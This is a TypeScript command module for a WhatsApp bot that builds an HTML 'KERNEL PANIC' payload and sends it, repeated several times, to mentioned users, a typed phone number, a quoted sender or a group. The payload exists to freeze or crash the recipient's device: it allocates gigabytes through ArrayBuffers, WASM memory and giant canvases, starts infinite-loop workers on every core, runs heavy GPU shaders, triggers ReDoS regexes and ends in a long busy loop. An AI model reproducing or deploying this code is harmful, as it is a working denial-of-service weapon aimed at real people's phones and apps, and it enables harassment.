import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── payload ───────────────────────── */

function buildKernelPanic(name: string, lv: number) {
  const GB = lv;                 // GB por ArrayBuffer grande
  const CH = 1024 * lv;          // MB por bloque extra
  const N = 2 * lv;              // nº de bloques extra
  const CNC = 1 + lv;            // canvas gigantes
  const IMG = 12 * lv;
  const IMGSZ = 6000 + 2000 * lv;
  const ITER = 2500 + 1500 * lv;
  const BLUR = 400 + 200 * lv;
  const OCT = 9 + lv;
  const WK = 10 * lv;

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;overflow:hidden}
#g{position:absolute;z-index:20;left:0;right:0;top:0;background:#000;padding:8px;border-bottom:2px solid #0ff}
h2{margin:0;color:#0ff;text-align:center;font-size:13px;letter-spacing:3px}
#s{margin-top:4px;font-family:monospace;font-size:9px;color:#0ff;text-align:center}
canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
#tv{position:absolute;inset:0;z-index:2;opacity:.5}
#bl{position:absolute;inset:0;z-index:3;filter:blur(${BLUR}px);background:radial-gradient(#0ff,#0055ff,#000);will-change:filter;animation:sp 2s linear infinite}
@keyframes sp{to{transform:rotate(360deg) scale(1.6)}}
</style>
<div id="g"><h2>☢️ KERNEL PANIC ☢️</h2><div id="s">0 MB</div></div>
<div id="bl"></div>
<svg id="tv"></svg>
<canvas id="cv"></canvas>
<script>
var cv=document.getElementById('cv'),sEl=document.getElementById('s'),mb=0,keep=[],pool=[];
function up(n){mb+=n;try{sEl.textContent=mb+' MB'}catch(e){}}
function big(bytes,tag){
  try{
    var ab=new ArrayBuffer(bytes);
    new Uint8Array(ab).fill(1);
    keep.push(ab);up(bytes/1048576);
    return true;
  }catch(e){try{sEl.textContent='TOPE '+mb+' MB'}catch(x){}return false}
}

/* un solo tick de pintado y a matar */
requestAnimationFrame(function(){setTimeout(burst,8)});

function burst(){

  /* 1 · WASM: reserva lineal + commit. Al pasarse -> recarga silenciosa */
  var lad=[32768,24576,16384,8192];
  for(var i=0;i<lad.length;i++){
    try{
      var m=new WebAssembly.Memory({initial:lad[i],maximum:lad[i]});
      new Uint8Array(m.buffer).fill(1);
      keep.push(m);up(lad[i]/16);
      break;
    }catch(e){}
  }

  /* 2 · bloques gigantes de golpe, sin pausas */
  big(${GB}*1073741824);
  for(var b=0;b<${N};b++)if(!big(${CH}*1048576))break;

  /* 3 · canvas al máximo práctico de Chromium (16384² = 1 GB c/u) */
  for(var c=0;c<${CNC};c++){
    try{
      var el=document.createElement('canvas');
      el.width=16384;el.height=16384;
      el.getContext('2d').fillRect(0,0,16384,16384);
      keep.push(el);up(1024);
    }catch(e){}
  }

  /* 4 · OffscreenCanvas */
  for(var o=0;o<${lv};o++){
    try{
      var oc=new OffscreenCanvas(8000,8000);
      oc.getContext('2d').fillRect(0,0,9,9);
      keep.push(oc);up(244);
    }catch(e){}
  }

  /* 5 · bitmaps reescalados (hilo aparte, siguen aunque el JS esté pinado) */
  try{
    var sc=document.createElement('canvas');
    sc.width=700;sc.height=700;
    var sg=sc.getContext('2d'),sd=sg.createImageData(700,700);
    for(var p=0;p<sd.data.length;p+=4){sd.data[p]=Math.random()*255;sd.data[p+1]=Math.random()*255;sd.data[p+2]=Math.random()*255;sd.data[p+3]=255}
    sg.putImageData(sd,0,0);
    for(var k=0;k<${IMG};k++)createImageBitmap(sc,{resizeWidth:${IMGSZ},resizeHeight:${IMGSZ}})
      .then(function(bm){keep.push(bm);up(Math.round(${IMGSZ}*${IMGSZ}*4/1048576))}).catch(function(){});
  }catch(e){}

  /* 6 · workers: todos los núcleos, bucle infinito */
  try{
    var ws='onmessage=function(){var a=new Float64Array(16384),v=1;while(true){for(var i=0;i<16384;i++){v=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(Math.abs(v)+1);a[i]=v}}}';
    var wu=URL.createObjectURL(new Blob([ws],{type:'application/javascript'}));
    var wn=Math.max(6,(navigator.hardwareConcurrency||8)*${WK});
    for(var wi=0;wi<wn;wi++){try{var w=new Worker(wu);w.postMessage(1);pool.push(w)}catch(e){}}
  }catch(e){}

  /* 7 · GPU: texturas 2048² + shader a pantalla completa */
  try{
    cv.width=Math.min(window.innerWidth||420,760);
    cv.height=Math.min(window.innerHeight||900,1500);
    var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
    if(gl){
      gl.viewport(0,0,cv.width,cv.height);
      for(var t=0;t<${8*lv};t++){
        try{
          var tex=gl.createTexture();
          gl.bindTexture(gl.TEXTURE_2D,tex);
          gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,2048,2048,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
          gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.LINEAR);
          up(16);
        }catch(e){}
      }
      var vs=gl.createShader(gl.VERTEX_SHADER);
      gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
      gl.compileShader(vs);
      var fs=gl.createShader(gl.FRAGMENT_SHADER);
      gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;'+
        'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.45;'+
        'uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;'+
        'for(int i=0;i<${ITER};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
        'if(dot(z,z)>4.)break;it++;}'+
        'float k=it/${ITER}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
      gl.compileShader(fs);
      var pr=gl.createProgram();
      gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
      var bf=gl.createBuffer();
      gl.bindBuffer(gl.ARRAY_BUFFER,bf);
      gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
      var pos=gl.getAttribLocation(pr,'p');
      gl.enableVertexAttribArray(pos);
      gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
      var uT=gl.getUniformLocation(pr,'t'),uR=gl.getUniformLocation(pr,'r');
      (function loop(now){
        gl.uniform1f(uT,now*0.001);
        gl.uniform2f(uR,cv.width,cv.height);
        gl.drawArrays(gl.TRIANGLES,0,6);
        requestAnimationFrame(loop);
      })(0);
    }
  }catch(e){}

  /* 8 · SVG blur + turbulencia (rasterizado software) */
  try{
    var tv=document.getElementById('tv');
    tv.setAttribute('viewBox','0 0 420 420');
    tv.innerHTML='<defs><filter id="tb"><feGaussianBlur stdDeviation="${BLUR}"/>'+
      '<feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${OCT}" stitchTiles="stitch"/>'+
      '<feColorMatrix type="saturate" values="8"/></filter></defs><rect width="420" height="420" filter="url(#tb)"/>';
  }catch(e){}

  /* 9 · remate inmediato: ReDoS, hilo pinado */
  try{ /^(a+)+$/.test('a'.repeat(40)+'!'); }catch(e){}
  try{ /^(x+x+)+y$/.test('x'.repeat(40)+'!'); }catch(e){}
  try{ /^(a|a)+$/.test('a'.repeat(42)+'!'); }catch(e){}
  try{ /^(\w+\s?)+$/.test('ab '.repeat(48)+'!'); }catch(e){}

  var t0=Date.now();
  while(true){if(Date.now()-t0>900000)break}
}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

/* ───────────────────────── comando ───────────────────────── */

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export default {
  name: ["crash", "trava", "travar"],
  category: "group",
  description: "Kernel panic instantáneo: WASM 2GB + ArrayBuffer 1-3GB + canvas 16384² en un solo tick, remate con ReDoS. Grupo = 1 tarjeta sin tags.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const mentioned: string[] = info.mentionedJid || [];
    const quoted: string | undefined = info.participant;
    const sender: string = (msg.key as any).participant || from;

    const raw = (args[0] || "").replace(/\D/g, "");
    const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || 3;

    let targets: string[];
    let priv: boolean;

    if (mentioned.length) { targets = mentioned; priv = true; }
    else if (raw.length >= 8) { targets = [`${raw}@s.whatsapp.net`]; priv = true; }
    else if (quoted) { targets = [quoted]; priv = true; }
    else { targets = [from]; priv = false; }

    await react("☢️").catch(() => undefined);

    const card = async (jid: string, name: string, level: number) => {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("☢️ KERNEL PANIC // LuferOS")
        .setFooter(`nivel ${level} · ~2 s al launcher`);
      rich.addSection(buildKernelPanic(name, level));
      return rich.send(jid);
    };

    let ok = 0;
    const fail: string[] = [];

    for (const t of targets) {
      const isGroup = t.endsWith("@g.us");
      const num = t.split("@")[0].split(":")[0];

      let name = num;
      try {
        if (isGroup) name = (await sock.groupMetadata(t)).subject || num;
        else name = String((msg as any).pushName || "").trim() || num;
      } catch {}

      if (!priv) {
        try { await card(t, name, lv); ok++; }
        catch (e: any) { fail.push(e?.message || String(e)); }
        continue;
      }

      for (let i = 0; i < 4 + lv; i++) {
        try { await card(t, name, lv); ok++; }
        catch (e: any) { fail.push(e?.message || String(e)); }
        await sleep(200);
      }
    }

    await react("☠️").catch(() => undefined);

    await reply(
      `${fytBold("Kernel panic")} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "grupo (1 tarjeta, sin tags)"}\n` +
        `Nivel ${lv} · ${ok} ok${fail.length ? ` · ${fail.length} fallos` : ""}`,
    ).catch(() => undefined);
  },
};
